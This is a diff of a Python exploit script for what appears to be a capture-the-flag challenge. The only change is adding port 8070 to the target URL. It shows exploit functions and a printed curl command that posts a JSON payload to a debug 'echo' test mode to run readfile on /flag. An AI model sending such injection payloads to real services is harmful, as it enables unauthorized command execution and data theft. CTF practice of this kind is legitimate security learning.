@@ -9,7 +9,7 @@ This script exploits the debug echo test mode for easy command execution.
 import requests
 import json
 
-def simple_exploit(target_url="http://ctf.dscjssstuniv.in"):
+def simple_exploit(target_url="http://ctf.dscjssstuniv.in:8070"):
     """
     Simple exploit using the echo test mode
     """
@@ -58,7 +58,7 @@ def simple_exploit(target_url="http://ctf.dscjssstuniv.in"):
         print(f"[-] Exploit failed: {e}")
         return False
 
-def advanced_tcp_exploit(target_url="http://ctf.dscjssstuniv.in"):
+def advanced_tcp_exploit(target_url="http://ctf.dscjssstuniv.in:8070"):
     """
     Advanced exploit using TCP self-connect (for educational purposes)
     """
@@ -93,7 +93,7 @@ def main():
         
         # Show manual command for reference
         print("\n[*] Manual exploitation command:")
-        print("curl 'http://ctf.dscjssstuniv.in/?test=echo' -X POST -H 'Content-Type: application/json' -d '{\"signal\":\"Echo\",\"command\":\"readfile(\\\"/flag\\\");\"}}'")
+        print("curl 'http://ctf.dscjssstuniv.in:8070/?test=echo' -X POST -H 'Content-Type: application/json' -d '{\"signal\":\"Echo\",\"command\":\"readfile(\\\"/flag\\\");\"}}'")
 
 if __name__ == "__main__":
     main()
